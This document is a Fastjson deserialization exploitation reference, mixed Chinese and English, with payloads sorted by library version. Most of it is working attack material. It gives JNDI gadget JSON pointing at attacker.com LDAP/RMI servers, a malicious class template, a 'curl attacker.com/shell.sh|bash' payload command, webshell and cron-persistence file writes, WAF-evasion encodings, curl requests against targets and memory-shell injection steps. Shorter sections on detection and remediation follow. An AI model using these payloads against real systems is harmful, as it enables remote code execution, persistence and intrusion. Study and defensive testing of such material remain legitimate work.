# Fastjson Exploitation Payloads Reference

> Phase 4 Validation Knowledge Base — Fastjson Deserialization

---

## 1. Overview & Version Timeline

| Version Range | AutoType Status | Key Bypass |
|---------------|----------------|------------|
| ≤ 1.2.24 | 默认开启 | 无需绕过，直接利用 |
| 1.2.25–1.2.41 | 默认关闭，黑名单 v1 | `L` 前缀 + `;` 后缀绕过 |
| 1.2.42 | 黑名单 hash 化 | 双写 `LL` + `;;` |
| 1.2.43 | 修复双写 | `[` 数组前缀绕过 |
| 1.2.44–1.2.45 | 加强黑名单 | mybatis 3.x 利用链 |
| 1.2.46 | 修复 mybatis | ibatis 利用 |
| 1.2.47 | 黑名单继续加强 | 缓存 mapping 绕过（无需 AutoType） |
| 1.2.48–1.2.61 | 更多黑名单 | 陆续爆出 gadget |
| 1.2.62–1.2.68 | safeMode 引入 | 期望类（expectClass）绕过 |
| 1.2.69–1.2.79 | safeMode | AutoCloseable 绕过 |
| 1.2.80+ | 严格限制 | 特定场景绕过 |
| 2.x | 全新架构 | 默认安全，需显式开启 |

---

## 2. Version ≤ 1.2.24 — 直接利用

### 2.1 TemplatesImpl (需要 Feature.SupportNonPublicField)

```json
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["yv66vg...BASE64_EVIL_CLASS..."],
  "_name": "a",
  "_tfactory": {},
  "_outputProperties": {}
}
```

**条件**: `JSON.parseObject(input, Feature.SupportNonPublicField)` 或 `JSON.parse(input, Feature.SupportNonPublicField)`

**恶意类模板**:

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("id");
        } catch (Exception e) {}
    }
    @Override
    public void transform(DOM d, SerializationHandler[] h) throws TransletException {}
    @Override
    public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) throws TransletException {}
}
```

### 2.2 JdbcRowSetImpl — JNDI 注入 (最常用)

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://attacker.com:1099/Exploit",
  "autoCommit": true
}
```

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
```

**JNDI 服务启动**:

```bash
# marshalsec RMI
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099

# marshalsec LDAP
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# JNDI-Injection-Exploit (自动适配)
java -jar JNDI-Injection-Exploit.jar -C "curl attacker.com/shell.sh|bash" -A attacker.com
```

### 2.3 BasicDataSource — BCEL ClassLoader (无需出网)

```json
{
  "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
  "driverClassName": "$$BCEL$$$l$8b$I$A$A$A...(BCEL编码的恶意类)...",
  "driverClassLoader": {
    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  }
}
```

**变体 (tomcat-dbcp2)**:

```json
{
  "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
  "driverClassName": "$$BCEL$$$l$8b...",
  "driverClassLoader": {
    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  }
}
```

**BCEL 编码生成**:

```bash
# 使用 BCEL 编码恶意 class
java -cp bcel-encoder.jar com.example.BCELEncode Evil.class
```

### 2.4 Spring JNDI

```json
{
  "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
  "targetBeanName": "ldap://attacker.com:1389/Exploit",
  "propertyPath": "foo",
  "beanFactory": {
    "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
    "shareableResources": ["ldap://attacker.com:1389/Exploit"]
  }
}
```

---

## 3. Version 1.2.25–1.2.41 — L/; 绕过

**原理**: 黑名单检查类名时未处理类描述符前缀

```json
{
  "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
```

**条件**: 需要手动开启 AutoType

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

---

## 4. Version 1.2.42 — 双写绕过

**原理**: 1.2.42 只去掉一层 `L` 和 `;`

```json
{
  "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
```

---

## 5. Version 1.2.43 — 数组绕过

**原理**: `[` 前缀标记数组类型，绕过类名检查

```json
{
  "@type": "[com.sun.rowset.JdbcRowSetImpl"[{,
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
```

---

## 6. Version 1.2.44–1.2.45 — MyBatis 利用链

**条件**: classpath 中存在 `mybatis 3.x.x` 且 `mybatis < 3.5.6`

```json
{
  "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
  "properties": {
    "data_source": "ldap://attacker.com:1389/Exploit"
  }
}
```

---

## 7. Version 1.2.47 — 缓存绕过 (通杀，无需 AutoType)

**核心**: 利用 `java.lang.Class` 的反序列化将恶意类写入 TypeUtils 缓存，绕过 AutoType 检查

```json
{
  "a": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
  }
}
```

**重要**: 此 payload 无需开启 AutoType，影响 1.2.25 ≤ version ≤ 1.2.47（在未开启 AutoType 的情况下）

**替代 gadget**:

```json
{
  "a": {
    "@type": "java.lang.Class",
    "val": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"
  },
  "b": {
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source": "ldap://attacker.com:1389/Exploit"
    }
  }
}
```

---

## 8. Version 1.2.62 — JNDI via InitialContext

**条件**: AutoType 开启

```json
{
  "@type": "org.apache.xbean.propertyeditor.JndiConverter",
  "AsText": "ldap://attacker.com:1389/Exploit"
}
```

---

## 9. Version 1.2.66 — 多个新 Gadget

**条件**: AutoType 开启

```json
// shiro-core
{
  "@type": "org.apache.shiro.jndi.JndiObjectFactory",
  "resourceName": "ldap://attacker.com:1389/Exploit"
}

// shiro-core 变体
{
  "@type": "org.apache.shiro.realm.jndi.JndiRealmFactory",
  "jndiNames": ["ldap://attacker.com:1389/Exploit"]
}

// anteros-core
{
  "@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
  "metricRegistry": "ldap://attacker.com:1389/Exploit"
}
```

---

## 10. Version 1.2.67 — ignite/caucho

```json
// Apache Ignite
{
  "@type": "org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
  "jndiNames": "ldap://attacker.com:1389/Exploit"
}

// Caucho Hessian
{
  "@type": "com.caucho.config.types.ResourceRef",
  "lookupName": "ldap://attacker.com:1389/Exploit"
}
```

---

## 11. Version 1.2.68 — expectClass 绕过

**原理**: 利用 `expectClass` 参数加载继承自期望类的恶意类

```json
// AutoCloseable 绕过
{
  "@type": "java.lang.AutoCloseable",
  "@type": "org.apache.commons.io.input.BOMInputStream",
  "delegate": {
    "@type": "org.apache.commons.io.input.ReaderInputStream",
    "reader": {
      "@type": "jdk.nashorn.api.scripting.URLReader",
      "url": "http://attacker.com/evil.js"
    },
    "charsetName": "UTF-8",
    "bufferSize": 1024
  }
}
```

### 文件写入 (写 Webshell)

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "org.apache.commons.io.output.WriterOutputStream",
  "writer": {
    "@type": "org.apache.commons.io.output.FileWriterWithEncoding",
    "file": "/var/www/html/shell.jsp",
    "charsetName": "UTF-8",
    "append": false
  },
  "charsetName": "UTF-8",
  "bufferSize": 8192,
  "writeImmediately": true
}
```

### 文件读取 (信息泄露)

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "org.apache.commons.io.input.BOMInputStream",
  "delegate": {
    "@type": "org.apache.commons.io.input.ReaderInputStream",
    "reader": {
      "@type": "org.apache.commons.io.input.CharSequenceReader",
      "charSequence": {"@type": "java.lang.String", "$ref": "$.x"}
    },
    "charsetName": "UTF-8",
    "bufferSize": 1024
  }
}
```

---

## 12. Version 1.2.80+ — SafeMode 绕过尝试

### 12.1 依赖特定依赖的绕过

```json
// groovy (需要 groovy 在 classpath)
{
  "@type": "java.lang.Exception",
  "@type": "org.codehaus.groovy.control.CompilationFailedException",
  "unit": {}
}

// aspectj
{
  "@type": "java.lang.Exception",
  "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}
```

### 12.2 Reference 绕过

```json
{
  "a": {"$ref": "$.b"},
  "b": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://attacker.com:1389/x", "autoCommit": true}
}
```

### 12.3 原生反序列化 (当使用 JSON.parseObject 配合特定 Feature)

```json
{
  "@type": "java.io.Serializable",
  "@type": "javax.swing.event.EventListenerList",
  ...
}
```

---

## 13. Non-JNDI Payloads (不出网利用)

### 13.1 TemplatesImpl (前文已述)

需要 `Feature.SupportNonPublicField`，不需要网络连接。

### 13.2 BasicDataSource + BCEL (前文已述)

适用于 Tomcat 环境 + JDK ≤ 8u251（之后 BCEL 被移除）。

### 13.3 C3P0 二次反序列化

```json
{
  "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
  "userOverridesAsString": "HexAsciiSerializedMap:ACED0005...(hex encoded serialized object)...;"
}
```

**生成 hex 数据**:

```bash
java -jar ysoserial.jar CommonsCollections6 "id" | xxd -p | tr -d '\n'
```

### 13.4 SnakeYAML 利用

```json
{
  "@type": "org.yaml.snakeyaml.Yaml",
  "val": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://attacker.com/yaml-payload.jar\"]]]]"
}
```

### 13.5 文件写入 + 计划任务/cron (持久化)

```json
// Step 1: 写入 cron 文件
{
  "@type": "java.lang.AutoCloseable",
  "@type": "org.apache.commons.io.output.WriterOutputStream",
  "writer": {
    "@type": "org.apache.commons.io.output.FileWriterWithEncoding",
    "file": "/var/spool/cron/root",
    "charsetName": "UTF-8"
  },
  "charsetName": "UTF-8",
  "bufferSize": 8192,
  "writeImmediately": true
}
```

---

## 14. JDK Version Impact on JNDI

| JDK Version | RMI Remote Ref | LDAP Remote Ref | Bypass |
|-------------|---------------|-----------------|--------|
| ≤ 8u121 / 7u131 | ✅ 直接利用 | ✅ 直接利用 | — |
| 8u121 – 8u191 | ❌ trustURLCodebase=false | ✅ 直接利用 | 用 LDAP |
| > 8u191 | ❌ | ❌ | 本地 Factory / 反序列化 |
| 11.0.1+ | ❌ | ❌ | 本地 Factory / 反序列化 |

### 高版本 JDK JNDI 绕过

```bash
# 1. BeanFactory + ELProcessor (需要 Tomcat)
java -jar JYso.jar -g tomcat_el -p "Runtime.getRuntime().exec('id')" --ldap-port 1389

# 2. 本地反序列化 gadget 通过 LDAP javaSerializedData
java -jar JYso.jar -g CommonsCollections6 -p "id" --ldap-port 1389 --type deser

# 3. BeanFactory + GroovyShell (需要 Groovy)
java -jar JYso.jar -g groovy_shell -p "\"id\".execute()" --ldap-port 1389

# 4. MLET (需要 JMX)
java -jar JYso.jar -g mlet -p "http://attacker.com/evil.mlet" --ldap-port 1389
```

---

## 15. Detection Patterns in Source Code

### 直接使用 Fastjson

```java
// 高危: 直接解析外部输入
JSON.parseObject(request.getParameter("data"));
JSON.parse(userInput);
JSONObject.parseObject(body);

// 高危: 开启 AutoType
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

// 高危: 添加 AutoType 白名单过于宽泛
ParserConfig.getGlobalInstance().addAccept("com.");

// 中危: 使用了 Feature.SupportNonPublicField
JSON.parseObject(input, TargetClass.class, Feature.SupportNonPublicField);
```

### 版本检查

```xml
<!-- pom.xml -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>  <!-- 高危 -->
</dependency>

<!-- 安全版本: >= 1.2.83 或迁移至 fastjson2 -->
```

### 全局配置检查

```java
// 检查是否开启了 safeMode (1.2.68+)
ParserConfig.getGlobalInstance().setSafeMode(true); // 安全

// 检查黑名单/白名单配置
// fastjson.properties
fastjson.parser.autoTypeAccept=com.example.dto.
fastjson.parser.safeMode=true
```

---

## 16. WAF Bypass Techniques

### Unicode 编码

```json
{"\u0040\u0074\u0079\u0070\u0065": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://attacker.com:1389/x", "autoCommit": true}
```

### 注释混淆

```json
{"@type"/**/: "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://attacker.com:1389/x", "autoCommit": true}
```

### 空白字符

```json
{    "@type":    "com.sun.rowset.JdbcRowSetImpl"    ,    "dataSourceName":"ldap://attacker.com:1389/x","autoCommit":true}
```

### 大小写 (Fastjson 不敏感)

```json
{"@Type": "com.sun.rowset.JdbcRowSetImpl", "DataSourceName": "ldap://attacker.com:1389/x", "AutoCommit": true}
```

### 十六进制编码

```json
{"\x40type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://attacker.com:1389/x", "autoCommit": true}
```

### 嵌套 + $ref

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/x","autoCommit":true}}
```

---

## 17. Fastjson vs Fastjson2

| Feature | Fastjson 1.x | Fastjson 2.x |
|---------|-------------|-------------|
| AutoType | 可开启 | 默认关闭，需 JSONReader.Feature.SupportAutoType |
| @type | 默认支持 | 需配置 |
| 安全性 | 多次绕过 | 架构重设计，更安全 |
| 包名 | com.alibaba.fastjson | com.alibaba.fastjson2 |

### Fastjson2 利用条件

```java
// 需要显式开启才可能存在风险
JSON.parseObject(input, JSONReader.Feature.SupportAutoType);

// 或全局配置
JSONFactory.getDefaultObjectReaderProvider().setAutoTypeBeforeHandler(
    new JSONReader.AutoTypeBeforeHandler() { ... }
);
```

---

## 18. Complete Exploitation Workflow

### Step 1: 确认 Fastjson 版本

```json
// 触发错误获取版本信息
{"@type": "java.lang.AutoCloseable"

// 或 DNS 探测
{"@type":"java.net.Inet4Address","val":"fastjson.xxx.dnslog.cn"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.cn"}}
```

### Step 2: 确认出网能力

```json
// DNSLog 探测
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}

// 或使用 URL 类
{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}
```

### Step 3: 选择 Payload

```
版本 ≤ 1.2.24 → JdbcRowSetImpl (JNDI) 或 TemplatesImpl
版本 1.2.25-1.2.41 + AutoType → L/; 绕过
版本 1.2.42 + AutoType → LL/;; 双写
版本 1.2.43 + AutoType → [ 数组绕过
版本 1.2.45 + AutoType + mybatis → JndiDataSourceFactory
版本 ≤ 1.2.47 → Class 缓存绕过（无需 AutoType）
版本 1.2.62-1.2.68 + AutoType → xbean/shiro gadget
版本 1.2.68+ → AutoCloseable expectClass
```

### Step 4: 适配 JDK 版本

```
JDK ≤ 8u121 → RMI/LDAP 均可
JDK 8u121-8u191 → 仅 LDAP
JDK > 8u191 → 本地 Factory 或反序列化 gadget
不出网 → BCEL / TemplatesImpl / C3P0 二次反序列化
```

### Step 5: 验证

```bash
# 1. DNSLog 确认
curl -X POST http://target/api -H "Content-Type: application/json" \
  -d '{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}'

# 2. JNDI 利用
curl -X POST http://target/api -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/x","autoCommit":true}'

# 3. 命令执行确认
curl -X POST http://target/api -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker:1099/x","autoCommit":true}'
```

---

## 19. Memory Shell Injection via Fastjson

### Tomcat Filter 内存马

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker:1389/TomcatFilterMemshell",
  "autoCommit": true
}
```

**LDAP 服务端配置 (JYso)**:

```bash
java -jar JYso.jar -g tomcat_filter_memshell -u "/shell" -pw "pass123" --ldap-port 1389
# 注入后访问: http://target/shell?cmd=id (Header: X-Pass: pass123)
```

### Spring Controller 内存马

```bash
java -jar JYso.jar -g spring_controller_memshell -u "/inject" --ldap-port 1389
```

### Agent 内存马 (无文件落地)

```bash
java -jar JYso.jar -g java_agent_memshell --ldap-port 1389
```

---

## 20. Remediation Verification

### 安全配置确认

```java
// 1. 升级到 fastjson >= 1.2.83 或迁移到 fastjson2
// 2. 开启 safeMode
ParserConfig.getGlobalInstance().setSafeMode(true);

// 3. 不开启 AutoType
// 确认无以下代码:
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  // ❌

// 4. 白名单尽量收窄
ParserConfig.getGlobalInstance().addAccept("com.example.dto.");  // 仅允许 DTO 类
```

### 测试用 Payload (无害探测)

```json
// 测试 AutoType 是否开启 (触发 ClassNotFoundException 而非 AutoType 错误)
{"@type": "java.lang.Runnable"}

// 测试版本 (通过错误信息)
{"@type": "non.existent.Class12345"}
// 1.2.24: 无报错(解析失败静默)
// 1.2.25+: autoType is not support
// 1.2.68+: safeMode not support autoType

// DNS 探测 (确认反序列化)
{"@type": "java.net.Inet4Address", "val": "test.dnslog.cn"}
```

---
